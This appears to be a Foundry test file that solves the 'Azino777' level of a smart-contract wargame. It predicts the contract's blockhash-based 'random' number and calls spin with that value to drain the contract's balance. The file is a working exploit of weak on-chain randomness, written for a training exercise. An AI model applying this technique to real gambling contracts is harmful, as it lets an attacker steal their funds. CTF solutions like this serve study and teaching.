// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/01_Azino777/Azino777.sol";

// forge test --match-contract Azino777Test -vvvv
contract Azino777Test is BaseTest {
    Azino777 instance;

    function setUp() public override {
        super.setUp();
        instance = new Azino777{value: 0.01 ether}();
        vm.roll(43133);
    }

    function testExploitLevel() public {
        uint256 rand = myRand();
        instance.spin{value: 0.01 ether}(rand);

        checkSuccess();
    }

        function myRand() internal view returns (uint256) {
        uint256 hashVal = uint256(blockhash(block.number - 1));
        return uint256((uint256(hashVal) / 1157920892373161954235709850086879078532699846656405640394575840079131296399)) % 100;
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
